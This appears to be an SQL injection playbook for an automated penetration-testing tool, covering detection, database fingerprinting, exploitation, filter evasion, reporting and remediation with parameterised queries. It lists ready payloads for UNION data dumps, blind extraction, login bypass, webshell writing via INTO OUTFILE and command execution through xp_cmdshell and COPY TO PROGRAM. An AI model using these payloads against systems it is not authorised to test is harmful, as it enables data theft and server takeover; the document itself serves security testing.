# Playbook: SQL Injection (SQLi)

Any parameter that reaches a database query: URL/POST params, JSON fields,
search/filter/sort/`id=` params, and headers (User-Agent, X-Forwarded-For,
Cookie). The app concatenated your input as SQL code instead of binding it as
data.

## Detection (deterministic first - avoid false positives)

1. **Map the inputs.** Crawl + `test_all_params`; include header injection points
   on auth'd requests.
2. **Error/boolean signal:** append `'`. A 500, SQL error string, or a reliable
   response *difference* between `' AND '1'='1` (true) and `' AND '1'='2` (false)
   indicates injectable logic. Confirm numeric context with `id=2-1` returning the
   `id=1` record.
3. **Blind, the strongest proof (this is what `test_injection` automates):**
   - **Time-based:** measure the target's own latency noise floor over 2+ unmodified
     requests FIRST, then require a `SLEEP(5)`/`pg_sleep(5)`/`WAITFOR DELAY '0:0:5'`
     payload to clearly beat it on repeated trials. Never flag on a single slow
     response - WAN/CDN jitter causes false positives.
   - **OOB:** DNS/HTTP callback via a controlled host confirms blind SQLi with no
     visible output.
4. **Status-aware:** skip 404/410 endpoints - there is no query to hit.

## DBMS fingerprint
Error text, `@@version`/`version()`, string-concat syntax, `information_schema`
(MySQL/Postgres/MSSQL) vs `sqlite_master` (SQLite).

## Exploitation
- **UNION** (reflected results): `' ORDER BY N-- -` for column count, `' UNION
  SELECT 1,2,3-- -` to find printed columns, then dump from `information_schema`.
- **Blind boolean:** `' AND SUBSTRING((subquery),1,1)='a'-- -`, binary-search chars.
- **Blind time:** `' AND IF(cond, SLEEP(3), 0)-- -`.
- **Auth bypass:** `admin'-- -`, `' OR 1=1 LIMIT 1-- -`.
- **Beyond data:** `LOAD_FILE`, `INTO OUTFILE` webshell, MSSQL `xp_cmdshell`,
  Postgres `COPY ... TO PROGRAM`.

## Filter / WAF bypass
Inline comments `UN/**/ION`, case `UnIoN`, hex `0x61`, no-space `UNION(SELECT(...))`,
`%0a`; `OR 1=1` blocked -> `OR 2>1`.

## Report
PoC = a value you could not otherwise retrieve (`@@version`, a password hash) OR a
confirmed conditional time delay stated against the measured baseline. Severity
High-Critical. Mark `verified: true` only when a deterministic check actually fired.

## Remediation
Parameterized queries / prepared statements (the fix). Least-privilege DB user,
disable file/`xp_cmdshell` privileges, input allow-listing as defense-in-depth.
